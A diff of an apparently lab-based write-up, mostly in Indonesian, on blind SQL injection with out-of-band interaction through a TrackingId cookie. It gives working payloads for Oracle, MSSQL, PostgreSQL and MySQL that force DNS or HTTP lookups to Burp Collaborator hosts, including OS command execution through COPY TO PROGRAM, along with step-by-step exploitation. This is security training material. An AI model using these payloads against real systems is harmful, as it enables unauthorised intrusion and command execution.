@@ -23,56 +23,103 @@ References:
 
 
 ---------------------------------------------
+# **Simple Proof of Concept: Blind SQL Injection with Out-of-Band Interaction**
 
+## **Langkah Mudah Eksploitasi**
 
-### Oracle
-```
-SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+### **1. Penjelasan Singkat**
+Blind SQL injection ini memanfaatkan interaksi out-of-band (OOB) melalui DNS untuk membuktikan kerentanan. Payload akan menyebabkan aplikasi melakukan DNS lookup ke domain Burp Collaborator.
 
-SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
-```
+---
 
-```
-FFyToxqSs49lpxuC'+AND+select+EXTRACTVALUE(xmltype('<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%+remote+SYSTEM+"http://q6xv6nktkah599jksflne4qcz35utqhf.oastify.com/">+%remote%3b]>'),'/l')+FROM+dual--
+### **2. Payload untuk Database Umum**
+Berikut adalah payload sederhana untuk setiap jenis database:
 
-FFyToxqSs49lpxuC'+AND+SELECT+UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')--
-```
-
-### Microsoft
-```
-exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
+#### **Oracle**
+```sql
+'+UNION SELECT EXTRACTVALUE(xmltype('<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
 ```
 
-```
-FFyToxqSs49lpxuC'+and+exec+master..xp_dirtree+'//BURP-COLLABORATOR-SUBDOMAIN/a'--
-```
-
-### PostgreSQL
-```
-copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
+#### **Microsoft SQL Server**
+```sql
+'+AND exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--
 ```
 
-```
-FFyToxqSs49lpxuC'+||+(copy+(SELECT+'')+to+program+'nslookup+BURP-COLLABORATOR-SUBDOMAIN')--
-```
-
-
-### MySQL
-```
-LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+#### **PostgreSQL**
+```sql
+'+|| (COPY (SELECT '') TO PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN')--
 ```
 
-```
-FFyToxqSs49lpxuC'+AND+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')--
+#### **MySQL**
+```sql
+'+AND LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')--
 ```
 
------------------------------------------------
+---
 
-Finally, the correct payload was the Oracle payload, changing the AND for a UNION and encoding the characters ;, ? and =:
+# **Penjelasan dan Langkah-Langkah Eksploitasi Blind SQL Injection dengan Out-of-Band Interaction**
 
+### **Penjelasan Singkat**
+Blind SQL Injection dengan metode Out-of-Band (OOB) memanfaatkan interaksi eksternal, seperti DNS lookup, untuk memvalidasi bahwa injeksi berhasil dilakukan. Pada lab ini, injeksi SQL dibuat untuk memaksa server melakukan lookup ke domain Burp Collaborator, membuktikan bahwa payload telah dieksekusi.
+
+---
+
+### **Payload Detail**
+Payload berikut digunakan pada database Oracle:
+
+```sql
+'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://tqn6voesrxt08naj53o2tp0ztqzhn7bw.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
 ```
-Cookie: TrackingId=FFyToxqSs49lpxuC'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://rfawfotutbq6iasl1guon5zd84ev2uqj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
-```
+
+#### **Penjelasan Detail Query:**
+1. **`UNION SELECT`**:
+   - Menggabungkan hasil query asli dengan query injeksi.
+   - Digunakan untuk menambahkan perintah injeksi tanpa merusak query asli.
+
+2. **`EXTRACTVALUE(xmltype(...), '/l')`**:
+   - **`EXTRACTVALUE`**: Fungsi Oracle yang mengekstrak nilai dari dokumen XML berdasarkan jalur XPath.
+   - **`xmltype(...)`**: Membuat dokumen XML dari string yang diberikan.
+
+3. **Payload XML**:
+   - **`<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://tqn6voesrxt08naj53o2tp0ztqzhn7bw.oastify.com/"> %remote;]>`**:
+     - Membuat entitas eksternal (`%remote`) yang mengacu ke URL (Burp Collaborator).
+     - Saat XML diproses, server mencoba mengakses URL tersebut, menghasilkan DNS lookup ke domain Burp Collaborator.
+
+4. **`FROM dual`**:
+   - **`dual`** adalah tabel dummy bawaan Oracle untuk menjalankan query sederhana.
+
+5. **Encoded Characters**:
+   - **`%3f`, `%3b`, dan `%25`**:
+     - Encoding untuk karakter `?`, `;`, dan `%`.
+     - Encoding ini memastikan payload dapat dikirim melalui URL tanpa diubah.
+
+6. **`--`**:
+   - Komentar SQL untuk mengabaikan sisa query asli, memastikan hanya payload yang dieksekusi.
+
+---
+
+### **Langkah-Langkah Eksploitasi**
+1. **Siapkan Burp Collaborator**:
+   - Buka **Burp Collaborator** di Burp Suite.
+   - Salin subdomain unik, misalnya: `tqn6voesrxt08naj53o2tp0ztqzhn7bw.oastify.com`.
+
+2. **Masukkan Payload**:
+   - Tempelkan payload di parameter **TrackingId** menggunakan subdomain Burp Collaborator Anda.
+   - Contoh:
+     ```plaintext
+     TrackingId=ABC123'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://tqn6voesrxt08naj53o2tp0ztqzhn7bw.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
+     ```
+
+3. **Monitor DNS Lookup**:
+   - Buka **Burp Collaborator** dan cek log untuk memastikan server melakukan DNS lookup ke domain Anda.
+
+---
+
+### **Hasil Eksploitasi**
+Jika server rentan, Anda akan melihat log di Burp Collaborator dengan detail lookup dari server ke subdomain yang Anda gunakan. Hal ini membuktikan bahwa payload berhasil dieksekusi, dan server melakukan komunikasi ke domain eksternal seperti yang diinstruksikan. 
+
+Payload ini sangat efektif untuk membuktikan kerentanan pada skenario Blind SQL Injection dengan Out-of-Band Interaction.
+
 
 
 
